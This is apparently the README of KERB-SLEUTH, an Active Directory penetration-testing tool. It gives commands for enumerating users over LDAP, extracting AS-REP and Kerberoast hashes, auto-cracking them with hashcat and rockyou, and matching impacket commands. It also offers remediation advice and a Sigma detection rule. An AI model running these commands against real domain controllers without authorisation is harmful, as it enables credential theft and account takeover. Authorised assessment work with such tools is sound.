```
██╗  ██╗███████╗██████╗ ██████╗       ███████╗██╗     ███████╗██╗   ██╗████████╗██╗  ██╗
██║ ██╔╝██╔════╝██╔══██╗██╔══██╗      ██╔════╝██║     ██╔════╝██║   ██║╚══██╔══╝██║  ██║
█████╔╝ █████╗  ██████╔╝██████╔╝█████╗███████╗██║     █████╗  ██║   ██║   ██║   ███████║
██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗╚════╝╚════██║██║     ██╔══╝  ██║   ██║   ██║   ██╔══██║
██║  ██╗███████╗██║  ██║██████╔╝      ███████║███████╗███████╗╚██████╔╝   ██║   ██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝       ╚══════╝╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝
```

<div align="center">

# 🔥 KERB-SLEUTH 🔥
### **Active Directory Kerberos Security Scanner**

[![GitHub license](https://img.shields.io/github/license/thechosenone-shall-prevail/KERB-SLEUTH?style=for-the-badge&color=darkred)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/blob/main/LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/thechosenone-shall-prevail/KERB-SLEUTH?style=for-the-badge&color=red)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/stargazers)
[![Go version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go)](https://golang.org/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=for-the-badge)](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/releases)

**🩸 BLEEDING WINDOWS AUTHENTICATION 🩸**

*A production-ready, single-binary Go tool for identifying AS-REP and Kerberoastable targets in Active Directory environments. Designed for offline-first operation with safe-by-default behavior.*

</div>

---

## ⚠️ **LEGAL DISCLAIMER** ⚠️

```diff
+ This tool is for AUTHORIZED security assessments ONLY!
+ Unauthorized access to computer systems is ILLEGAL and punishable by law.
+ Always ensure you have explicit written permission before using this tool.
+ The authors assume NO LIABILITY for misuse or damage caused by this program.
```

---

##  **FEATURES**

###  **Core Capabilities**
-  **AS-REP Roasting Detection** - Identifies accounts with pre-authentication disabled
-  **Kerberoasting Detection** - Finds accounts with Service Principal Names (SPNs)
-  **Live LDAP Enumeration** - Real-time Active Directory reconnaissance via LDAP/LDAPS
-  **Direct Target Input** - Simple `kerb-sleuth <IP/hostname>` interface
-  **Intelligent Scoring System** - Configurable heuristics for risk assessment
-  **Real Hash Extraction** - Extracts actual AS-REP and Kerberoast hashes from live targets

###  **Advanced Hash Cracking**
-  **Automated Hash Export** - Separate `.txt` files for each attack type
-  **Hashcat Integration** - Automatic cracking with modes 18200 (AS-REP) and 13100 (Kerberoast)
-  **John the Ripper Support** - Alternative cracking engine with format detection
-  **Wordlist Detection** - Smart fallback to common wordlist locations
-  **Result Tracking** - `.pot` files with cracked password display
-  **Cracking Guide Generation** - Manual command reference for offline cracking

###  **Data Processing**
-  **Multiple Input Formats** - CSV, LDIF, JSON support for offline analysis
-  **Live & Offline Modes** - Direct LDAP enumeration or file-based analysis
-  **Smart LDAP Parsing** - Automatic domain detection and user enumeration
-  **Synthetic Data Generator** - Built-in test data creation for testing
-  **Anonymous & Authenticated** - Supports both anonymous and credentialed LDAP access

###  **Output Formats**
-  **JSON Reports** - Detailed results with scoring and comprehensive metadata
-  **CSV Summaries** - Simplified tabular format for executive reporting
-  **Sigma Rules** - Generated detection rules for SIEM integration
-  **Hash Files** - `asrep_hashes.txt` and `kerberoast_hashes.txt` for cracking tools
-  **Cracking Logs** - Detailed progress tracking in `results/crack_*.log`

###  **Security & Safety Features**
-  **Authorization Required** - `--i-am-authorized` flag prevents accidental misuse
-  **Comprehensive Logging** - Detailed audit trails with emoji-enhanced output
-  **Single Binary** - Zero external dependencies for core functionality  
-  **Production Ready** - Robust error handling, connection retry, and validation
-  **SSL/TLS Support** - LDAPS connections with `--ssl` flag
-  **Legal Warnings** - Built-in reminders for authorized use only

###  **Deployment & Integration**
-  **Kali Linux Ready** - Pre-configured installation scripts
-  **Docker Support** - Containerized deployment options
-  **CI/CD Integration** - GitHub Actions with automated testing
-  **Easy Installation** - `make install` for system-wide deployment
-  **Simple Interface** - Intuitive command structure for rapid deployment

---

##  **INSTALLATION**

###  **Pre-built Binaries**
```bash
# Download from releases
wget https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/releases/latest/download/kerb-sleuth-linux-amd64
chmod +x kerb-sleuth-linux-amd64
./kerb-sleuth-linux-amd64 --help
```

###  **Build from Source**
```bash
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
make build
```

###  **Kali Linux (Automated)**
```bash
# One-liner install
curl -sSL https://raw.githubusercontent.com/thechosenone-shall-prevail/KERB-SLEUTH/main/quick-install.sh | bash

# Full installation with dependencies
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
chmod +x install-kali.sh
./install-kali.sh
```

###  **Docker**
```bash
# Build and run with Docker
git clone https://github.com/thechosenone-shall-prevail/KERB-SLEUTH.git
cd KERB-SLEUTH
./install-docker.sh

# Quick run
./run-docker.sh scan --ad /data/users.csv

# Shell access
./docker-shell.sh

# Docker Compose
docker-compose up -d
docker-compose exec kerb-sleuth ./kerb-sleuth --help
```

---

## ⚡ **QUICK START** 

###  **LIVE TARGET HUNTING** (Primary Mode)

**Just give it a target IP or hostname - KERB-SLEUTH does the rest!**

```bash
# 1️⃣ Basic hunt (anonymous connection)
kerb-sleuth hunt --target 10.0.0.1

# 2️⃣ Hunt with domain name  
kerb-sleuth hunt --target dc01.corp.local

# 3️⃣ Hunt with credentials (if anonymous fails)
kerb-sleuth hunt --target 10.0.0.1 --user guest --pass ''

# 4️⃣ Hunt with SSL and auto-cracking (requires authorization)
kerb-sleuth hunt --target 10.0.0.1 --ssl --crack --i-am-authorized
```

###  **WHAT HAPPENS AUTOMATICALLY:**

1. ** LDAP Connection** - Tries anonymous first, falls back to LDAPS if needed
2. ** User Enumeration** - Pulls all AD users via live LDAP queries  
3. ** AS-REP Hunting** - Finds accounts with `DoesNotRequirePreAuth=True`
4. ** Kerberoast Hunting** - Finds accounts with Service Principal Names (SPNs)
5. ** Risk Scoring** - Intelligent scoring based on password age, group membership, etc.
6. ** Results Export** - JSON, CSV, and SIEM-ready Sigma rules
7. ** Auto-Cracking** *(if `--crack` enabled)* - Extracts hashes and runs hashcat with rockyou.txt

###  **EXAMPLE OUTPUT:**
```
🩸 KERB-SLEUTH v1.0.0 - Kerberos Vulnerability Hunter 

 Attempting to connect to target: 10.0.0.1
 Connected via Anonymous LDAP, Base DN: DC=corp,DC=local  
 Domain: CORP.LOCAL
 Enumerated 1,337 users from target
 Found 3 AS-REP candidates
 Found 12 Kerberoast candidates  
 Results written to: results.json

 Starting hash extraction and cracking...
 AS-REP hashes exported to: hashes/asrep_hashes.txt
 Starting AS-REP hash cracking with wordlist: /usr/share/wordlists/rockyou.txt  
 CRACKED PASSWORDS FOUND!
backup_svc:Password123!

 Hunt complete! High: 2 | Medium: 8 | Low: 5 risk targets
 2 HIGH RISK targets found! Check results.json for details
```

---

###  **LEGACY FILE ANALYSIS** (Optional)

If you already have exported AD files, you can analyze them offline:

```bash
# Analyze exported CSV/JSON/LDIF files
kerb-sleuth analyze --ad users.csv --out results.json

# Generate test data
kerb-sleuth simulate --dataset small --out tests/sample_data/
```

---

##  **USAGE EXAMPLES**

###  **Live Target Hunting** (Primary Mode)
```bash
# Anonymous hunting (tries LDAP port 389)
kerb-sleuth hunt --target 192.168.1.10

# Specific domain controller  
kerb-sleuth --target dc01.corp.local

# With authentication (if anonymous blocked)
kerb-sleuth hunt --target 10.0.0.1 --user 'CORP\guest' --pass ''
kerb-sleuth hunt --target 10.0.0.1 --user scanner --pass 'P@ssw0rd'

# Secure connection (LDAPS port 636)
kerb-sleuth hunt --target 10.0.0.1 --ssl

# Full attack chain with auto-cracking
kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized
```

###  **Advanced Hunting & Exploitation**
```bash
# Hunt with custom wordlist
kerb-sleuth hunt --target 10.0.0.1 --crack --wordlist /opt/wordlists/custom.txt --i-am-authorized

# Hunt with multiple outputs
kerb-sleuth hunt --target 10.0.0.1 --csv --siem --crack --i-am-authorized

# Custom configuration
kerb-sleuth hunt --target 10.0.0.1 --config custom-weights.yml
```

###  **File Analysis** (Legacy Mode)
```bash
# Analyze exported AD files
kerb-sleuth analyze --ad users.csv --out results.json
kerb-sleuth analyze --ad export.json --csv --siem

# Generate test data
kerb-sleuth simulate --dataset large --out tests/sample_data/
```

###  **Docker Usage**
```bash
# Run in Docker container
./run-docker.sh hunt --target 10.0.0.1

# Interactive shell
./docker-shell.sh
```

---

##  **OUTPUT FORMATS**

###  **JSON Output**
```json
{
  "summary": {
    "total_users": 1337,
    "asrep_candidates": 13,
    "kerberoast_candidates": 42,
    "high_risk": 7,
    "medium_risk": 23,
    "low_risk": 25
  },
  "candidates": [
    {
      "sam": "backup_svc",
      "type": "ASREP",
      "score": 95,
      "severity": "High",
      "reasons": [
        "DoesNotRequirePreAuth enabled",
        "Password older than 365 days",
        "Member of Domain Admins",
        "Never logged in"
      ],
      "spns": [],
      "pwd_last_set": "2022-01-15T10:30:00Z",
      "member_of": ["CN=Domain Admins,CN=Users,DC=corp,DC=local"],
      "suggested_action": "Disable account or enable pre-authentication"
    },
    {
      "sam": "sql_service",
      "type": "KERBEROAST", 
      "score": 87,
      "severity": "High",
      "reasons": [
        "Multiple SPNs registered",
        "Password older than 180 days",
        "High-value service account"
      ],
      "spns": [
        "MSSQLSvc/sql01.corp.local:1433",
        "MSSQLSvc/sql01.corp.local"
      ],
      "export_hash_path": "exports/kerb_hashes.txt",
      "suggested_action": "Implement Managed Service Accounts (MSA)"
    }
  ]
}
```

###  **CSV Summary**
```csv
SamAccountName,Type,Score,Severity,Reasons,SPNs,ExportHashPath
backup_svc,ASREP,95,High,"DoesNotRequirePreAuth enabled; Password older than 365 days",,
sql_service,KERBEROAST,87,High,"Multiple SPNs registered; Password older than 180 days","MSSQLSvc/sql01.corp.local:1433",exports/kerb_hashes.txt
```

###  **Sigma Detection Rules**
```yaml
title: AS-REP Roasting Detection
description: Detects potential AS-REP roasting attempts
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: 0
  condition: selection
level: high
```

---

## ⚙️ **CONFIGURATION**

###  **Custom Scoring Weights** (`configs/defaults.yml`)
```yaml
weights:
  # AS-REP Roasting Weights
  asrep_base: 50
  asrep_preauth: 30
  asrep_pwd_old: 20
  asrep_admin_group: 25
  asrep_never_login: 15
  asrep_disabled_penalty: -50
  
  # Kerberoasting Weights  
  kerberoast_base: 40
  kerberoast_spn: 25
  kerberoast_multiple_spns: 15
  kerberoast_pwd_old: 20
  kerberoast_high_value: 30

thresholds:
  high: 85
  medium: 60
  low: 30

time:
  pwd_old_days: 90
  pwd_very_old_days: 365
  never_login_days: 30

admin_groups:
  - "CN=Domain Admins"
  - "CN=Enterprise Admins"
  - "CN=Schema Admins"
  - "CN=Administrators"
  - "CN=Backup Operators"

high_value_services:
  - "MSSQLSvc"
  - "HTTP"
  - "LDAP"
  - "CIFS"
  - "HOST"
```

---

##  **DEVELOPMENT**

###  **Running Tests**
```bash
# Run all tests
make test

# Run with coverage
make test-coverage

# Run specific package tests
go test ./pkg/ingest -v
```

###  **Building for Multiple Platforms**
```bash
# Build for all platforms
make build-all

# Specific platform builds
make build-linux
make build-windows
make build-mac
```

###  **Docker Development**
```bash
# Build docker image
make docker-build

# Run in container
make docker-run
```

###  **Release Preparation**
```bash
# Automated release preparation
./prepare-release.sh

# Manual steps:
# 1. Update version in go.mod
# 2. Run tests: make test
# 3. Build binaries: make build-all
# 4. Create git tag: git tag v1.0.0
# 5. Push to GitHub: git push origin v1.0.0
# 6. Create GitHub release with binaries
```

---

## 🔥 **HOW IT WORKS** 

### **Step-by-Step Workflow:**

1. ** Give it a target:** `kerb-sleuth hunt --target 10.0.0.1`

2. ** Auto-Discovery:**
   - Resolves hostname to IP
   - Tries anonymous LDAP connection (port 389)
   - Falls back to LDAPS (port 636) if needed
   - Discovers domain name and base DN

3. ** User Enumeration:**
   - Pulls ALL Active Directory users via live LDAP
   - Extracts user properties (UAC, SPNs, groups, etc.)

4. ** Vulnerability Detection:**
   - **AS-REP Roasting:** Finds `DoesNotRequirePreAuth=True` accounts
   - **Kerberoasting:** Finds accounts with Service Principal Names (SPNs)

5. ** Risk Assessment:**
   - Scores based on password age, group membership, account activity
   - Prioritizes high-value targets (Domain Admins, service accounts, etc.)

6. ** Results Export:**
   - JSON for detailed analysis
   - CSV for spreadsheet import  
   - Sigma rules for SIEM integration

7. ** Auto-Exploitation** *(optional with `--crack`)*:
   - Extracts AS-REP hashes (`hashcat -m 18200`)
   - Extracts Kerberoast hashes (`hashcat -m 13100`) 
   - Auto-cracks with `rockyou.txt` wordlist
   - Shows cracked passwords immediately

### **🎪 No Manual Steps Required!**
- ❌ No need to export AD data manually
- ❌ No need to run separate tools for hash extraction
- ❌ No need to figure out hashcat modes
- ✅ Just point it at a DC and let it hunt!

---

##  **OLD vs NEW WORKFLOW**

### ❌ **Traditional Approach (Complex)**
```bash
# Step 1: Export AD data manually
Get-ADUser -Filter * -Properties * | Export-Csv users.csv

# Step 2: Copy file to attacker machine  
scp users.csv attacker@kali:~/

# Step 3: Analyze with multiple tools
kerb-sleuth analyze --ad users.csv
impacket-GetNPUsers domain.com/user -usersfile users.txt
impacket-GetUserSPNs domain.com/user -request

# Step 4: Extract hashes manually
# Step 5: Run hashcat with correct modes
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
```

### ✅ **KERB-SLEUTH Approach (Simple)**
```bash
# One command does everything!
kerb-sleuth hunt --target 10.0.0.1 --crack --i-am-authorized

# That's it! 
# ✅ Enumerates users via live LDAP  
# ✅ Finds AS-REP & Kerberoast targets
# ✅ Extracts hashes automatically
# ✅ Cracks with rockyou.txt
# ✅ Shows results immediately
```

###  **Why KERB-SLEUTH is Better:**
- ** Point & Shoot:** Just give it a target IP/hostname
- ** Fully Automated:** No manual export or hash extraction steps  
- ** Real-time:** Works against live DCs, not just exported files
- ** Intelligent:** Auto-detects connection methods and domains
- ** Complete:** Finds vulnerabilities AND exploits them
- ** Professional:** Clean outputs ready for reporting


---

## 🤝 **CONTRIBUTING**

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

###  **Security Policy**
- All contributions must follow security-first principles
- No real credentials or sensitive data in code
- Synthetic test data only
- All destructive operations require explicit authorization

###  **Bug Reports**
Found a bug? Please open an issue with:
- Operating system and Go version
- Command that caused the issue
- Expected vs actual behavior
- Sample data (anonymized)

---

##  **ROADMAP**

###  **Version 2.0**
- [ ] Live Active Directory integration
- [ ] Real-time monitoring capabilities
- [ ] Advanced machine learning scoring
- [ ] Web dashboard interface
- [ ] Kubernetes deployment

###  **Future Features**
- [ ] BloodHound integration
- [ ] Azure AD support
- [ ] Custom plugin system
- [ ] Distributed scanning
- [ ] Mobile app companion

---

##  **STATISTICS**

```
Lines of Code: ~2,500
Test Coverage: >85%
Supported Formats: CSV, LDIF, JSON
Output Formats: JSON, CSV, Sigma Rules
Platforms: Windows, Linux, macOS, ARM64
```

---

##  **HALL OF FAME**

###  **Contributors**
- **@thechosenone-shall-prevail** - Project Creator & Lead Developer

###  **Special Thanks**
- Active Directory community for testing and feedback
- Go security community for best practices
- Red team operators for real-world validation

---

##  **SUPPORT**

-  **Documentation**: Check the [Wiki](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/wiki)
-  **Discussions**: [GitHub Discussions](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/discussions)  
-  **Issues**: [Bug Reports](https://github.com/thechosenone-shall-prevail/KERB-SLEUTH/issues)
-  **Email**: ss1812@srmist.edu.in[domain] (for security issues only)

---

##  **LICENSE**

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

<div align="center">

###  **REMEMBER** 

**Use this tool ethically and legally. Always obtain proper authorization.**

---

*Made with :D by [@thechosenone-shall-prevail](https://github.com/thechosenone-shall-prevail)*

**⭐ Star this repo if you find it useful! ⭐**

</div>
